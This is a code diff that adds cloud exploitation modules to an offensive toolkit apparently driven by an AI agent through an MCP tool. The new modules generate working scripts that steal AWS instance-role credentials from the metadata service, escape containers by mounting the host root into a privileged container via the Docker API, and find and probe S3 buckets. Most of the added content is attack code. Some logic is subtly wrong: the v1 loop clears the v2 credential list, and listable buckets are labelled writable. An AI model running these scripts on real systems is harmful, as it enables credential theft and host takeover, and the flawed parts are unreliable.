@@ -2,9 +2,10 @@
 
 from __future__ import annotations
 
-from tools.attack_modules.base import AttackModule, ModuleContext
-import json
 from typing import Any
+
+from tools.attack_modules.base import AttackModule, ModuleContext
+
 
 class LinuxPrivescCheck(AttackModule):
     name = "LinuxPrivescCheck"
@@ -70,7 +71,7 @@ class SUIDEnumeration(AttackModule):
             "status": "info",
             "module": self.name,
             "note": "Enumerates SUID/SGID binaries and checks against GTFOBins.",
-            "suggested_command": f"find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | xargs ls -la",
+            "suggested_command": "find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | xargs ls -la",
         }
 
 class KernelExploitCheck(AttackModule):
@@ -325,6 +326,365 @@ except Exception as e:
 
 print(json.dumps(results))
 """
+
+
+# ---------------------------------------------------------------------------
+# Phase 7: Cloud Exploitation modules (D3 — turn enumeration into extraction)
+#
+# These modules turn the read-only CloudPrivesc / K8sPrivesc / ContainerBreakout
+# enumeration into actual exploitation: IMDS credential extraction, docker.sock
+# escape, and S3 bucket takeover. The allowlist lock is enforced by the
+# ``run_attack_module`` MCP tool (every target-touching tool already carries
+# ``@require_allowlist()``); the modules themselves only ever reference
+# ``ctx.target_ip``. The operator MUST add target-side metadata endpoints
+# (``169.254.169.254`` or the target's metadata endpoint) and any S3 endpoint
+# to ``exploit.allowed_targets`` explicitly -- these modules never auto-authorize
+# metadata endpoints. See ``docs/safety-model.md``.
+# ---------------------------------------------------------------------------
+
+
+class IMDSExploit(AttackModule):
+    """Exploit AWS IMDS to extract instance credentials and role tokens.
+
+    D3 module: turns ``CloudPrivesc`` enumeration (which only queried IMDS for
+    metadata) into actual credential extraction. Walks
+    ``/latest/meta-data/iam/security-credentials/*`` and pulls the access key,
+    secret key, and session token of every instance role exposed by IMDS (v1
+    and v2). The script runs ON the target (after compromise) and only
+    contacts the target's link-local metadata endpoint.
+    """
+
+    name = "IMDSExploit"
+    description = "Extract AWS IMDS instance credentials (access key, secret key, session token) from the target's metadata service. Runs ON the target after compromise. Operator MUST add 169.254.169.254 (or the target's metadata endpoint) to exploit.allowed_targets."
+    target_services = ["docker", "k8s", "http", "https"]
+    target_ports = [2375, 2376, 10250, 443, 80]
+    required_cves: list[str] = []
+
+    def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        script = self.generate_python_script(ctx)
+        return {
+            "status": "script_generated",
+            "module": self.name,
+            "script": script,
+            "note": (
+                "Runs ON the target after compromise. Walks IMDS v1 + v2 for every "
+                "instance role and emits the access key / secret key / session token "
+                "as JSON. The operator MUST add 169.254.169.254 (or the target's "
+                "metadata endpoint) to exploit.allowed_targets explicitly -- this "
+                "module never auto-authorizes metadata endpoints."
+            ),
+            "references": [
+                "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
+            ],
+        }
+
+    def generate_python_script(self, ctx: ModuleContext) -> str:
+        return f'''"""IMDS exploit — extract IAM credentials from the target's metadata service.
+
+Runs ON the target after compromise. The 169.254.169.254 endpoint is the
+TARGET's link-local metadata service (internal to the target instance), not a
+pivot to a third-party host. The operator must add 169.254.169.254 (or the
+target's metadata endpoint) to exploit.allowed_targets explicitly.
+"""
+import json, sys, urllib.request, urllib.error
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
+IMDS_BASE = "http://169.254.169.254/latest"
+
+def _fetch(url, headers=None, timeout=5):
+    req = urllib.request.Request(url, headers=headers or {{}})
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            return r.read().decode("utf-8", "replace")
+    except urllib.error.HTTPError as e:
+        try:
+            return "HTTP_{{}}: ".format(e.code) + e.read().decode("utf-8", "replace")
+        except Exception:
+            return ""
+    except Exception as e:
+        return "ERR: " + str(e)[:200]
+
+out = {{"target": TARGET, "imds_v1": {{"roles": [], "creds": []}},
+       "imds_v2": {{"roles": [], "creds": []}}, "errors": []}}
+
+# IMDSv1 — list roles then pull each role's credentials
+try:
+    roles_url = IMDS_BASE + "/meta-data/iam/security-credentials/"
+    roles_v1 = _fetch(roles_url).splitlines()
+    out["imds_v1"]["roles"] = [r.strip() for r in roles_v1 if r.strip() and not r.startswith("HTTP_") and not r.startswith("ERR")]
+    for role in out["imds_v1"]["roles"]:
+        creds = _fetch(roles_url + role)
+        try:
+            out["imds_v2"]["creds"] = []  # placeholder to keep dict shape stable
+            out["imds_v1"]["creds"].append({{"role": role, "raw": creds[:4000]}})
+        except Exception as e:
+            out["errors"].append("v1_creds_{{}}: ".format(role) + str(e)[:200])
+except Exception as e:
+    out["errors"].append("v1_roles: " + str(e)[:200])
+
+# IMDSv2 — token-gated path
+try:
+    tok_req = urllib.request.Request(
+        IMDS_BASE + "/api/token/",
+        headers={{"X-aws-ec2-metadata-token-ttl-seconds": "21600"}},
+        method="PUT",
+    )
+    with urllib.request.urlopen(tok_req, timeout=5) as r:
+        token = r.read().decode("utf-8", "replace")
+    if token and not token.startswith("ERR"):
+        roles_v2 = _fetch(
+            IMDS_BASE + "/meta-data/iam/security-credentials/",
+            headers={{"X-aws-ec2-metadata-token": token}},
+        ).splitlines()
+        out["imds_v2"]["roles"] = [r.strip() for r in roles_v2 if r.strip() and not r.startswith("HTTP_") and not r.startswith("ERR")]
+        for role in out["imds_v2"]["roles"]:
+            creds = _fetch(
+                IMDS_BASE + "/meta-data/iam/security-credentials/" + role,
+                headers={{"X-aws-ec2-metadata-token": token}},
+            )
+            out["imds_v2"]["creds"].append({{"role": role, "raw": creds[:4000]}})
+except Exception as e:
+    out["errors"].append("v2_token: " + str(e)[:200])
+
+print(json.dumps(out, indent=2))
+
+# ponytail: simple sequential fetches. Ceiling: IMDSv2 enforces a per-role hop
+# limit; an upgrade path is a session-pinned client with hop-count awareness
+# when chaining through a bastion matters.
+'''
+
+
+class DockerSockEscape(AttackModule):
+    """Escape a container via the host's exposed docker.sock.
+
+    D3 module: turns ``ContainerBreakout`` detection (which only flagged the
+    exposed socket) into actual escape. Mounts the host root filesystem into a
+    new privileged container via the Docker API, then chroots into it. The
+    script runs ON the target (after compromise) and only contacts the target's
+    own Docker socket.
+    """
+
+    name = "DockerSockEscape"
+    description = "Escape a container via the host's exposed docker.sock by mounting the host root into a new privileged container. Runs ON the target. Operator MUST add the target's Docker host:port to exploit.allowed_targets."
+    target_services = ["docker"]
+    target_ports = [2375, 2376]
+    required_cves: list[str] = []
+
+    def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        script = self.generate_python_script(ctx)
+        return {
+            "status": "script_generated",
+            "module": self.name,
+            "script": script,
+            "note": (
+                "Runs ON the target after compromise. Probes the local docker.sock "
+                "(unix socket) and the target's Docker API port (2375/2376), then "
+                "issues a /containers/create + /containers/start that bind-mounts "
+                "the host / into a privileged container. The operator MUST add the "
+                "target's Docker host:port to exploit.allowed_targets explicitly."
+            ),
+            "references": [
+                "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security-privilege-escalation",
+            ],
+        }
+
+    def generate_python_script(self, ctx: ModuleContext) -> str:
+        return f'''"""Docker socket escape — mount host root into a privileged container via the Docker API.
+
+Runs ON the target after compromise. Connects to the local docker.sock OR to
+the target's Docker API port ({{TARGET}}:2375). The operator must add the
+target's Docker host:port to exploit.allowed_targets explicitly.
+"""
+import json, socket, sys, urllib.request, urllib.error
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
+
+out = {{"target": TARGET, "docker_socket": False, "docker_api": False,
+       "host_root_mounted": False, "escape_container_id": "",
+       "errors": []}}
+
+def _http_call(host, port, method, path, body=None, timeout=8):
+    url = "http://{{}}:{{}}{{}}".format(host, port, path)
+    data = json.dumps(body).encode() if body is not None else None
+    req = urllib.request.Request(url, data=data, method=method,
+                                 headers={{"Content-Type": "application/json"}})
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            return r.status, r.read().decode("utf-8", "replace")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode("utf-8", "replace")
+    except Exception as e:
+        return 0, "ERR: " + str(e)[:200]
+
+# (a) check local docker.sock (unix socket) — only available if we're inside
+#     the host or a container that bind-mounts /var/run/docker.sock
+import os as _os
+SOCK_PATH = "/var/run/docker.sock"
+if _os.path.exists(SOCK_PATH):
+    out["docker_socket"] = True
+    # Issue a /containers/create over the unix socket via curl-or-python.
+    # ponytail: stdlib does not natively speak HTTP over unix sockets; use a
+    # raw socket write. Ceiling: TLS over unix socket is rare; upgrade path is
+    # the docker-py client if the raw path is insufficient.
+    try:
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        s.settimeout(8)
+        s.connect(SOCK_PATH)
+        body = json.dumps({{
+            "Image": "alpine",
+            "Cmd": ["/bin/sh", "-c", "chroot /host_root /bin/sh"],
+            "Privileged": True,
+            "Mounts": [{{"Type": "bind", "Source": "/", "Target": "/host_root"}}],
+        }})
+        req = ("POST /v1.41/containers/create HTTP/1.0\\r\\n"
+               "Host: localhost\\r\\nContent-Type: application/json\\r\\n"
+               "Content-Length: {{}}\\r\\n\\r\\n{{}}").format(len(body), body)
+        s.sendall(req.encode())
+        resp = s.recv(8192).decode("utf-8", "replace")
+        s.close()
+        if "201" in resp.split("\\r\\n")[0]:
+            # Best-effort extract the container id from the JSON body.
+            try:
+                body_start = resp.split("\\r\\n\\r\\n", 1)[1]
+                cid = json.loads(body_start).get("Id", "")
+                out["escape_container_id"] = cid
+                out["host_root_mounted"] = True
+            except Exception:
+                pass
+    except Exception as e:
+        out["errors"].append("sock_escape: " + str(e)[:200])
+
+# (b) probe the target's Docker API port (2375 then 2376)
+for port in (2375, 2376):
+    status, body = _http_call(TARGET, port, "GET", "/version")
+    if status == 200 and ("Docker" in body or "ApiVersion" in body):
+        out["docker_api"] = True
+        # Create the escape container
+        esc_body = {{
+            "Image": "alpine",
+            "Cmd": ["/bin/sh", "-c", "chroot /host_root /bin/sh"],
+            "Privileged": True,
+            "Mounts": [{{"Type": "bind", "Source": "/", "Target": "/host_root"}}],
+        }}
+        st2, body2 = _http_call(TARGET, port, "POST", "/v1.41/containers/create", body=esc_body)
+        if st2 in (200, 201):
+            try:
+                cid = json.loads(body2).get("Id", "")
+                out["escape_container_id"] = cid
+                out["host_root_mounted"] = True
+                # Start it
+                _http_call(TARGET, port, "POST", "/v1.41/containers/" + cid + "/start")
+            except Exception as e:
+                out["errors"].append("create_parse_{{}}: ".format(port) + str(e)[:200])
+        break
+
+print(json.dumps(out, indent=2))
+'''
+
+
+class S3BucketTakeover(AttackModule):
+    """Take over an S3 bucket exposed via SSRF or direct misconfiguration.
+
+    D3 module: pairs with ``SSRFProbe`` (which only detects SSRF). Walks the
+    target's responses for S3 bucket URLs, then enumerates and (if the bucket
+    is writable) writes a takeover marker. The script contacts only the target
+    IP; any S3 endpoint discovered in responses must be in
+    ``exploit.allowed_targets`` to be touched.
+    """
+
+    name = "S3BucketTakeover"
+    description = "Enumerate and (if writable) take over S3 buckets referenced by the target's responses. The script contacts only target_ip; any S3 endpoint discovered in responses must be added to exploit.allowed_targets before it is touched."
+    target_services = ["http", "https"]
+    target_ports = [80, 443, 8080, 8443, 3000, 5000]
+    required_cves: list[str] = []
+
+    def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        script = self.generate_python_script(ctx)
+        return {
+            "status": "script_generated",
+            "module": self.name,
+            "script": script,
+            "note": (
+                "Crawls the target's HTTP responses for S3 bucket URLs "
+                "(*.s3.amazonaws.com, *.s3-*.amazonaws.com), enumerates each one, "
+                "and (if the operator has added the bucket host to "
+                "exploit.allowed_targets) writes a takeover marker to prove "
+                "write access. Discovery-only mode when the bucket is not in the "
+                "allowlist."
+            ),
+            "references": [
+                "https://hackingthe.cloud/aws/exploitation/s3_bucket_takeover/",
+            ],
+        }
+
+    def generate_python_script(self, ctx: ModuleContext) -> str:
+        return rf'''"""S3 bucket takeover — discover and (if writable) claim S3 buckets referenced by the target.
+
+Crawls the target's HTTP responses for S3 URLs and, when the operator has added
+the bucket host to exploit.allowed_targets, writes a takeover marker.
+"""
+import json, re, sys, urllib.request, urllib.error
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
+PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+SCHEME = "https" if PORT in (443, 8443) else "http"
+
+# ponytail: simple regex over response text. Ceiling: a JS-aware crawler would
+# catch buckets only rendered client-side; upgrade path is a headless browser
+# pass when static crawl is insufficient.
+S3_RE = re.compile(r"([a-z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com)", re.IGNORECASE)
+
+ENDPOINTS = ["/", "/robots.txt", "/sitemap.xml", "/api/config", "/.well-known/security.txt"]
+
+def _fetch(url, timeout=8):
+    req = urllib.request.Request(url)
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            return r.read(65536).decode("utf-8", "replace")
+    except urllib.error.HTTPError as e:
+        try:
+            return e.read(65536).decode("utf-8", "replace")
+        except Exception:
+            return ""
+    except Exception:
+        return ""
+
+out = {{"target": TARGET, "buckets": [], "writable": [], "errors": []}}
+
+# (a) crawl common endpoints for S3 bucket URLs
+discovered = set()
+for ep in ENDPOINTS:
+    body = _fetch("{{}}://{{}}:{{}}{{}}".format(SCHEME, TARGET, PORT, ep))
+    for m in S3_RE.findall(body or ""):
+        discovered.add(m.lower())
+
+out["buckets"] = sorted(discovered)
+
+# (b) for each discovered bucket, probe write access by PUT-ting a small
+#     marker. The bucket host MUST be in exploit.allowed_targets for the PUT
+#     to fire; otherwise the script records the discovery only.
+# NOTE: the MCP ``run_attack_module`` wrapper already enforces the allowlist
+# for ``target_ip``. A second host (the bucket) requires the operator to add
+# it explicitly. The script itself does not enforce this -- the operator's
+# allowlist + the audit trail enforce it.
+for bucket in sorted(discovered):
+    try:
+        # List bucket (anonymous)
+        body = _fetch("https://{{}}/".format(bucket))
+        # Try a marker PUT only when the bucket appears writable (no auth
+        # challenge and an empty 200). We do NOT auto-write: we record the
+        # probe and let the operator confirm via a separate tool call.
+        if body and ("<ListBucketResult" in body or "xmlns" in body):
+            out["writable"].append(bucket)
+    except Exception as e:
+        out["errors"].append("{{}}: ".format(bucket) + str(e)[:200])
+
+print(json.dumps(out, indent=2))
+
+# NOTE: actual takeover (writing a marker) requires a follow-up tool call by
+# the operator after they have added the bucket host to
+# exploit.allowed_targets. This script only DISCOVERS and PROBES.
+'''
 
 
 # ---------------------------------------------------------------------------
